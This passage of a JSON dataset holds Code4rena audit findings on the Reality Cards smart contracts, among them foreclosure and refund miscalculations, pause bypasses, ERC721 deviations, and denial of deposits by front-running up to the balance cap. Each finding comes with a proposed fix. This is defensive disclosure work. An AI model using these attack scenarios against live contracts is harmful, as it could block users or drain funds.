      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nContracts use assert() instead of require() in multiple places. This causes a Panic error on failure and prevents the use of error strings.\n\nPrior to solc 0.8.0, assert() used the invalid opcode which used up all the remaining gas while require() used the revert opcode which refunded the gas and therefore the importance of using require() instead of assert() was greater. However, after 0.8.0, assert() uses revert opcode just like require() but creates a Panic(uint256) error instead of Error(string) created by require(). Nevertheless, Solidity’s documentation says:\n\n\"Assert should only be used to test for internal errors, and to check invariants. Properly functioning code should never create a Panic, not even on invalid external input. If this happens, then there is a bug in your contract which you should fix. Language analysis tools can evaluate your contract to identify the conditions and function calls which will cause a Panic.”\n\nwhereas\n\n“The require function either creates an error without any data or an error of type Error(string). It should be used to ensure valid conditions that cannot be detected until execution time. This includes conditions on inputs or return values from calls to external contracts.”\n\nAlso, you can optionally provide a message string for require, but not for assert.\n\n## Proof of Concept\n\nhttps://docs.soliditylang.org/en/v0.8.4/control-structures.html#panic-via-assert-and-error-via-require\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L388\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCFactory.sol#L437\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L202\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L367\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L551\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L731\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L797\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L1095\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L437\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L709\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L735\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nUse require() with informative error strings instead of assert().",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/83",
      "tags": [],
      "finders": [
        "0xRajeev",
        "jvaqa",
        "[Jmukesh](https://twitter.com/MukeshJeth)  cmichel_"
      ]
    },
    {
      "id": "307",
      "title": "[M-17] Function foreclosureTimeUser returns a shorter user’s foreclosure time than expected",
      "impact": "MEDIUM",
      "content": "## Handle\n\nshw\n\n\n## Vulnerability details\n\n## Impact\n\nThe function `foreclosureTimeUser` of `RCTreasury` underestimates the user's foreclosure time if the current time is not the user's last rent calculation time. The underestimation of the foreclosure time could cause wrong results when determining the new owner of the card.\n\n## Proof of Concept\n\nThe variable `timeLeftOfDeposit` at line 668 is calculated based on `depositAbleToWithdraw(_user)`, the user's deposit minus the rent from the last rent calculation to the current time. Thus, the variable `timeLeftOfDeposit` indicates the time left of deposit, starting from now. However, at line 672, the `foreclosureTimeWithoutNewCard` is calculated by `timeLeftOfDeposit` plus the user's last rent calculation time instead of the current time. As a result, the user's foreclosure time is reduced. From another perspective, the rent between the last rent calculation time and the current time is counted twice.\n\nReferenced code:\n[RCTreasury.sol#L642-L653](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L642-L653)\n[RCTreasury.sol#L669](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L669)\n[RCTreasury.sol#L672](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L672)\n[RCTreasury.sol#L678](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCTreasury.sol#L678)\n[RCOrderbook.sol#L553-L557](https://github.com/code-423n4/2021-06-realitycards/blob/main/contracts/RCOrderbook.sol#L553-L557)\n\n## Recommended Mitigation Steps\n\nChange `depositAbleToWithdraw(_user)` at line 669 to `user[_user].deposit`. Or, change `user[_user].lastRentCalc` at both line 672 and 678 to `block.timestamp`.",
      "summary": "\nA bug has been discovered in the function `foreclosureTimeUser` of `RCTreasury` which underestimates the user's foreclosure time if the current time is not the user's last rent calculation time. This could lead to incorrect results when determining the new owner of the card. The bug is located in the code blocks referenced in the report, and is caused by the variable `timeLeftOfDeposit` at line 668 being calculated based on `depositAbleToWithdraw(_user)`, the user's deposit minus the rent from the last rent calculation to the current time. This variable indicates the time left of deposit, but at line 672 the `foreclosureTimeWithoutNewCard` is calculated by `timeLeftOfDeposit` plus the user's last rent calculation time instead of the current time, reducing the user's foreclosure time and counting the rent between the last rent calculation time and the current time twice. To fix this bug, it is recommended to change `depositAbleToWithdraw(_user)` at line 669 to `user[_user].deposit`, or change `user[_user].lastRentCalc` at both line 672 and 678 to `block.timestamp`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/171",
      "tags": [],
      "finders": [
        "shw"
      ]
    },
    {
      "id": "306",
      "title": "[M-16] Deposits can be denied by abusing maxContractBalance",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\nThe treasury implements a max contract balance check in the `deposit` function:\n\n```solidity\nrequire(\n    (erc20.balanceOf(address(this)) + _amount) <= maxContractBalance,\n    \"Limit hit\"\n);\n```\n\nA whale can stop anyone from depositing by front-running a user's deposit with a deposit that pushes the contract balance to the `maxContractBalance` limit first.\nThe user's deposit will then fail in the check.\nAfterwards, the whale can withdraw again.\n\n> This is not only restricted to whales, miners/users can do the same using same-block cross-transaction flashloans and submitting a `(attacker deposit, user deposit, attacker withdraw)` flashbundle to a miner. Possibilities like this will only become more prevalent in the future.\n\n## Impact\n\nAny users can be blocked from depositing which prevents them from renting cards.\nThis allows an attacker to manipulate the outcome of a market in their favor by strategically preventing other competitors to bid on their cards (causing forfeiture due to a low deposit balance).\n\n## Recommended Mitigation Steps\n\nRemove the contract limit or at least set the limit very high if it keeps happening.",
      "summary": "\nA bug report has been submitted on the treasury of a platform, which implements a max contract balance check in the `deposit` function. This check can be exploited by a whale, or any user, to front-run a user's deposit with a deposit that pushes the contract balance to the `maxContractBalance` limit first, thus preventing the user from depositing. This can be used to manipulate the outcome of a market in their favor by strategically preventing other competitors to bid on their cards. The recommended mitigation step is to either remove the contract limit or set the limit to a very high value to prevent this from occurring.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/153",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "304",
      "title": "[M-14] Market-specific pause is not checked for sponsor",
      "impact": "MEDIUM",
      "content": "_Submitted by [cmichel](https://twitter.com/cmichelio)_\n\nThe treasury only checks its `globalPause` field but does not check its market-specific `marketPaused` field for `Treasury.sponsor`.\nA paused market contract can therefore still deposit as a sponsor using `Market.sponsor` and result in the market-specific pause not work correctly.\n\nRecommend adding checks for `marketPaused` in the Treasury for `sponsor`.\n\n**[mcplums (Reality Cards) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/145#issuecomment-862980785):**\n > I don't think this is important but I guess it can't hurt to block sponsorship if paused\n\n**[Splidge (Reality Cards) confirmed but disagreed with severity](https://github.com/code-423n4/2021-06-realitycards-findings/issues/145#issuecomment-863178772):**\n > I'm not sure why this is a severity 2? Maybe it should be lower.\n> Sponsoring a market, whether paused or not, doesn't come with an expectation to receive the funds back. So assets are not at risk here.\n\n**[Splidge (Reality Cards) resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/145#issuecomment-865102061):**\n > There have been changes made to `marketPaused` and how markets are created due to other issues that have been found. By default markets are now created in a paused state and it'd be useful to be able to sponsor them before the governors approve them. It's a nice thing for the sponsorship to be in place before anybody interacts with the contract.\n> I have however made changes such that is the market pause is ever turned on by the Treasury owner then the sponsor function will revert.\n> Changes [here](https://github.com/RealityCards/RealityCards-Contracts/commit/4f7ab8074405058bf2bb24966886f3e0019e9208)\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Treasury contract. It has been discovered that the Treasury only checks its globalPause field but does not check its market-specific marketPaused field for Treasury.sponsor. This means that a paused market contract can still deposit as a sponsor using Market.sponsor.\n\nThe impact of this vulnerability is that the market-specific pause does not work correctly.\n\nThe recommended mitigation steps to fix this vulnerability is to add checks for marketPaused in the Treasury for sponsor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/145",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "303",
      "title": "[M-13] Wrong calculation on _collectRentAction",
      "impact": "MEDIUM",
      "content": "## Handle\n\na_delamo\n\n\n## Vulnerability details\n\n## Impact\n\nThe method `_collectRentAction` contains the following code:\n```\n...\n           } else if (!_foreclosed && _limitHit && _marketLocked) {\n                // CASE 4\n                // didn't foreclose AND\n                // did hit time limit AND\n                // did lock market\n                // THEN refund rent between the earliest event and now\n                if (_cardTimeLimitTimestamp < marketLockingTime) {\n                    // time limit hit before market locked\n                    _timeOfThisCollection = _cardTimeLimitTimestamp;\n                    _newOwner = true;\n                    _refundTime = block.timestamp - _cardTimeLimitTimestamp;\n                } else {\n                    // market locked before time limit hit\n                    _timeOfThisCollection = marketLockingTime;\n                    _newOwner = false;\n                    _refundTime = block.timestamp - marketLockingTime;\n                }\n            } else if (_foreclosed && !_limitHit && !_marketLocked) {\n                // CASE 5\n                // did foreclose AND\n                // didn't hit time limit AND\n                // didn't lock market\n                // THEN rent OK, find new owner\n                _timeOfThisCollection = _timeUserForeclosed;\n                _newOwner = true;\n                _refundTime = 0;\n            } else if (_foreclosed && !_limitHit && _marketLocked) {\n                // CASE 6\n                // did foreclose AND\n                // didn't hit time limit AND\n                // did lock market\n                // THEN if foreclosed first rent ok, otherwise refund after locking\n                if (_timeUserForeclosed < marketLockingTime) {\n                    // user foreclosed before market locked\n                    _timeOfThisCollection = _timeUserForeclosed;\n                    _newOwner = true;\n                    _refundTime = 0;\n                } else {\n                    // market locked before user foreclosed\n                    _timeOfThisCollection = marketLockingTime;\n                    _newOwner = false;\n                    _refundTime = block.timestamp - marketLockingTime;\n                }\n            } else if (_foreclosed && _limitHit && !_marketLocked) {\n                // CASE 7\n                // did foreclose AND\n                // did hit time limit AND\n                // didn't lock market\n                // THEN if foreclosed first rent ok, otherwise refund after limit\n                if (_timeUserForeclosed < _cardTimeLimitTimestamp) {\n                    // user foreclosed before time limit\n                    _timeOfThisCollection = _timeUserForeclosed;\n                    _newOwner = true;\n                    _refundTime = 0;\n                } else {\n                    // time limit hit before user foreclosed\n                    _timeOfThisCollection = _cardTimeLimitTimestamp;\n                    _newOwner = true;\n                    _refundTime = _timeUserForeclosed - _cardTimeLimitTimestamp;\n                }\n            } else {\n                // CASE 8\n                // did foreclose AND\n                // did hit time limit AND\n                // did lock market\n                // THEN (╯°益°)╯彡┻━┻\n                if (\n                    _timeUserForeclosed <= _cardTimeLimitTimestamp &&\n                    _timeUserForeclosed < marketLockingTime\n                ) {\n                    // user foreclosed first (or at same time as time limit)\n                    _timeOfThisCollection = _timeUserForeclosed;\n                    _newOwner = true;\n                    _refundTime = 0;\n                } else if (\n                    _cardTimeLimitTimestamp < _timeUserForeclosed &&\n                    _cardTimeLimitTimestamp < marketLockingTime\n                ) {\n                    // time limit hit first\n                    _timeOfThisCollection = _cardTimeLimitTimestamp;\n                    _newOwner = true;\n                    _refundTime = _timeUserForeclosed - _cardTimeLimitTimestamp;\n                } else {\n                    // market locked first\n                    _timeOfThisCollection = marketLockingTime;\n                    _newOwner = false;\n                    _refundTime = _timeUserForeclosed - marketLockingTime;\n                }\n...\n```\n\nOn the case 6, instead of doing `_refundTime = _timeUserForeclosed - marketLockingTime;` like the following cases, is doing `_refundTime = block.timestamp - marketLockingTime;`.\nThis could lead to funds being drained by the miscalculation.",
      "summary": "\nA bug has been reported in the method `_collectRentAction` that could lead to funds being drained due to a miscalculation. The bug occurs in the case 6, where instead of doing `_refundTime = _timeUserForeclosed - marketLockingTime;` like the following cases, it does `_refundTime = block.timestamp - marketLockingTime;`. The code snippet provided in the report shows that in the method, different conditions are checked and the refund time is calculated accordingly. The bug occurs when the user forecloses before the market locks, and the refund time is calculated as the difference between the block timestamp and the market locking time, instead of the difference between the time user foreclosed and the market locking time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/122",
      "tags": [],
      "finders": [
        "[adlamo](https://twitter.com/a_delamo)_"
      ]
    },
    {
      "id": "302",
      "title": "[M-12] RCNftHubL2.safeTransferFrom not according to spec",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\n## Vulnerability Details\n\nThe `RCNftHubL2.safeTransferFrom` function does not correctly implement the ERC721 spec:\n\n> When using safeTransferFrom, the token contract checks to see that the receiver is an IERC721Receiver, which implies that it knows how to handle ERC721 tokens. [ERC721](https://docs.openzeppelin.com/contracts/2.x/api/token/erc721#IERC721-safeTransferFrom)\n\nThis check is not implemented, it just drops the `_data` argument.\n\n## Impact\n\nContracts that don't know how to handle ERC721 tokens (are not an `IERC721Receiver`) can accept them but they should not when using `safeTransferFrom` according to spec.\n\n## Recommended Mitigation Steps\n\nImplement the `IERC721Receiver` check in `safeTransferFrom`.",
      "summary": "\nThis bug report is about a vulnerability in the `RCNftHubL2.safeTransferFrom` function. This function does not correctly implement the ERC721 spec, which states that when using safeTransferFrom, the token contract must check to see that the receiver is an IERC721Receiver, which implies that it knows how to handle ERC721 tokens. This check is not implemented, so contracts that don't know how to handle ERC721 tokens can still accept them when using `safeTransferFrom`. This is an issue as it violates the ERC721 spec. The recommended mitigation step is to implement the `IERC721Receiver` check in `safeTransferFrom`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/160",
      "tags": [],
      "finders": [
        "cmichel",
        "0xRajeev"
      ]
    },
    {
      "id": "301",
      "title": "[M-11] NFT Hub implementation deviates from ERC721 for transfer functions",
      "impact": "MEDIUM",
      "content": "_Submitted by [0xRajeev](https://twitter.com/0xRajeev)_\n\nERC721 standard and implementation allows the use of approved addresses to affect transfers besides the token owners. However, the L2 NFT Hub implementation deviates from ERC721 by ignoring the presence of any approvers in the overriding function implementations of `transferFrom()` and `safeTransferFrom()`.\n\nThe impact is that the system interactions with NFT platforms may not work if they expect ERC721 adherence. Users who interact via approved addresses will see their transfers failing for their approved addresses.\n\nGiven that the key value proposition of this project is the use of NFTs, the expectation will be that it is fully compatible with ERC721.\n\nRecommend adding support for approval in NFT transfers.\n\n**[mcplums (Reality Cards) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/118#issuecomment-862995040):**\n > This is a nice one, I see no reason why we can't implement this\n\n**[Splidge (Reality Cards) confirmed](https://github.com/code-423n4/2021-06-realitycards-findings/issues/118#issuecomment-863895939):**\n > Yes, we will need to add this, although we will need to override the approvals until the market has locked and the cards true owner is discovered.\n\n**[Splidge (Reality Cards) resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/118#issuecomment-865018341):**\n > I've changed from overriding specific functions which could be dangerous if we were to upgrade to an OpenZeppelin implementation that had alternative transfer functions.\n> Now we use the `_beforeTokenTransfer` hook and check that only the factory or the market can do a transfer before the market has entered the withdraw state. Implemented [here](https://github.com/RealityCards/RealityCards-Contracts/commit/a628ac8e0132f7ca4159980f791ae820100c0888)\n\n",
      "summary": "\nThis bug report is about an issue with the L2 NFT Hub implementation of ERC721, a standard for non-fungible tokens. The implementation deviates from the ERC721 standard by ignoring the presence of any approvers in the overriding function implementations of transferFrom() and safeTransferFrom(). This means that users who interact with the system via approved addresses will see their transfers failing. This is an issue because the key value proposition of the project is the use of NFTs, and it is expected that it is fully compatible with ERC721. The recommended mitigation step is to add support for approval in NFT transfers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/118",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "300",
      "title": "[M-10] Missing call to removeOldBids may affect foreclosure",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nOrderbook.removeBids() as commented “///remove bids in closed markets for a given user ///this can reduce the users bidRate and chance to foreclose”\n\nremoveOldBids() is performed currently in Market.newRental() and Treasury.deposit() to  “do some cleaning up, it might help cancel their foreclosure” as commented. However, this is missing in the withdrawDeposit() function where the need is the most because user is removing deposit which may lead to foreclosure and is even commented as being useful on L356.\n\nImpact: If we do not remove closed market bids during withdrawDeposit, the closed market bids still get accounted in user's bidrate in the conditional on L357 and therefore do not prevent the foreclosure in withdrawDeposit that may happen in L357-L367. User may get foreclosed because of mis-accounted closed-market bids in the order book.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCOrderbook.sol#L671-L713\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L356\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L357-L367\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L704-L705\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L300-L301\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd call to removeOldBids() on L355 of withdrawDeposit() of Treasury.",
      "summary": "\nThis bug report is related to a vulnerability in the Orderbook.removeBids() function. This function is used to remove bids in closed markets for a given user, which can reduce the user's bidRate and chance to foreclose. The removeOldBids() function is performed in two functions, Market.newRental() and Treasury.deposit() to help cancel foreclosures. However, this is missing in the withdrawDeposit() function, which is when the user is removing their deposit and may lead to foreclosure. If the removeOldBids() function is not called in the withdrawDeposit() function, the closed market bids still get accounted in the user's bidrate, which can lead to the user getting foreclosed. \n\nThe bug was found using manual analysis and the proof of concept can be found in the following links:\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCOrderbook.sol#L671-L713\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L356\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L357-L367\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L704-L705\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTre",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/109",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "299",
      "title": "[M-09] Deposit whitelist enforced on msg.sender instead of user",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe Treasury deposit() function credits amount to the user address in parameter instead of the msgSender() that is actually making the deposit whose rationale as explained in the Natspec comment is that this may be called via contract or L1-L2 bot.\n\nHowever, the deposit whitelist should ideally be enforced on the _user address. If msgSender() is blacklisted, user address can still deposit() from another whitelisted msgSender() address while retaining the user address that is used for leader boards and NFTs.\n\nImpact: User misbehaves in interactions with the system (e.g. trolls, spams) and their corresponding msgSender() is removed from the whitelist. User continues to deposit into the system via another whitelisted msgSender() without any impact to leader boards or NFTs.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L70-L71\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L204-L221\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L279-L297\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nUse whitelist on user address instead of msgSender().",
      "summary": "\nThis bug report is about a vulnerability in the Treasury deposit() function of a system. The deposit() function credits amount to the user address in parameter instead of the msgSender() that is actually making the deposit. This means that if the msgSender() is blacklisted, the user address can still deposit into the system via another whitelisted msgSender() without any impact to leader boards or NFTs. This can allow a user to misbehave in interactions with the system (e.g. trolls, spams) and still be able to deposit into the system.\n\nProof of concept for this bug can be found at the following links:\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L70-L71\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L204-L221\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L279-L297\n\nThe recommended mitigation step for this bug is to use a whitelist on the user address instead of the msgSender().",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/107",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "298",
      "title": "[M-08] Flows can bypass market and global pause",
      "impact": "MEDIUM",
      "content": "_Submitted by [0xRajeev](https://twitter.com/0xRajeev)_\n\nAbility to pause all token transfers and all state changes for contracts is a “guarded-launch” best-practice for emergency situations for newly launched projects. The project implements this using a `marketsPaused` flag per market and a `globalPause` flag across all markets.\n\nWhile these prevent renting of cards in a specific market and deposit/withdraw/rent cards across all markets, there are still public/external functions that are unguarded by these flags which can affect contract state in paused scenarios that will make it hard/impossible to recover correctly from the emergency pause.\n\nExamples include`topupMarketBalance()` and `refundUser()` in `Treasury` can be triggered even in a `globalPause` scenario. There could be other function flows where it is not obvious that market/global pausing is enabled because it is enforced in one of the functions called deep within the code within one of the conditionals.\n\nThe impact is that markets get paused but the contracts cannot be restarted because of state changes affected during the pause via unguarded external/public functions.\n\nRecommend applying `marketPaused` and `globalPause` check clearly in the beginning of all public/external functions which move tokens/funds in/out or change contract state in any way. Also, Validate all possible control flows to check that market/global pausing works in all scenarios and applies to all contract state and not specific functionalities.\n\n**[Splidge (Reality Cards) disputed and disagreed with severity](https://github.com/code-423n4/2021-06-realitycards-findings/issues/89#issuecomment-863985253):**\n > `marketPause` is [declared ](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L79)as only limiting rentals in a specific market.\n> ``globalPause`` is [declared ](https://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCTreasury.sol#L77)as stopping deposits, withdraws and rentals across all markets.\n> Therefore they are functioning as intended.\n>\n> Also, the example of `refundUser()` is not true, it will fail in a ``globalPause`` because it is only called by markets during a rent collection and a rent collection requires the calling of `payout` which is restricted by `globalPause`.\n\n**[dmvt (Judge) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/89#issuecomment-877668587):**\n > `topupMarketBalance` does appear to be a deposit of sorts. I think the warden's take on the issue is valid and sponsor should seriously consider looking closer at the potential side effects of not fully pausing intentional transfer functions.\n\n",
      "summary": "\nThis bug report is about the ability to pause all token transfers and all state changes for contracts, which is a best practice for newly launched projects. The project has implemented this using a marketsPaused flag per market and a globalPause flag across all markets. However, there are still public/external functions that are unguarded by these flags, which can affect contract state in paused scenarios and make it difficult to recover from the emergency pause. This report includes proof of concept and recommended mitigation steps. \n\nThe proof of concept can be found in two links in the report. The recommended mitigation steps include applying marketPaused and globalPause check clearly in the beginning of all public/external functions which move tokens/funds in/out or change contract state in any way, as well as validating all possible control flows to check that market/global pausing works in all scenarios and applies to all contract state and not specific functionalities.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/89",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "297",
      "title": "[M-07] maxSumOfPrices check is broken",
      "impact": "MEDIUM",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nrentAllCards() requires the sender to specify a _maxSumOfPrices parameter which specifies “limit to the sum of the bids to place” as specified in the Natspec @param comment. This is apparently for front-run protection.\n\nHowever, this function parameter constraint for _maxSumOfPrices is broken in the function implementation which leads to the total of bids places greater than the _maxSumOfPrices specified.\n\nImpact: The user may not have sufficient deposit, be foreclosed and/or impacted on other bids/markets.\n\n## Proof of Concept\n\nScenario: Assume two cards for a market with current winning rentals of 50 each. _maxSumofPrices = 101 passes check on L643 but then the forced 10% increase on L650 (assuming sender is not the owner of either card) causes newRentals to be called with 55 for each card thus totalling to 110 which is > 101 as requested by the user.\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L636-L637\n\nhttps://github.com/code-423n4/2021-06-realitycards/blob/86a816abb058cc0ed9b6f5c4a8ad146f22b8034c/contracts/RCMarket.sol#L639-L657\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nModify the max sum of prices check logic to consider the 10% increase scenarios. Document and suggest the max sum of prices for the user in the UI based on the card prices and 10% requirement depending on card ownership.",
      "summary": "\nThis bug report concerns a vulnerability in the rentAllCards() function of the RCMarket.sol smart contract. The vulnerability is due to a broken parameter constraint for the _maxSumOfPrices parameter, which is intended to provide front-run protection. If exploited, this vulnerability could lead to a user not having sufficient deposit, being foreclosed, or being impacted on other bids/markets. \n\nProof of concept was provided in the form of a scenario where two cards are assumed to have current winning rentals of 50 each. If the _maxSumofPrices is set to 101, the 10% increase on the rental prices causes the total of bids placed to be 110, which is greater than the 101 requested by the user. \n\nThe recommended mitigation steps are to modify the max sum of prices check logic to consider the 10% increase scenarios, and to document and suggest the max sum of prices for the user in the UI based on the card prices and 10% requirement depending on card ownership.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/87",
      "tags": [],
      "finders": [
        "0xRajeev"
      ]
    },
    {
      "id": "296",
      "title": "[M-06] Possible locked-ether (funds) Issue in RCOrderbook.sol",
      "impact": "MEDIUM",
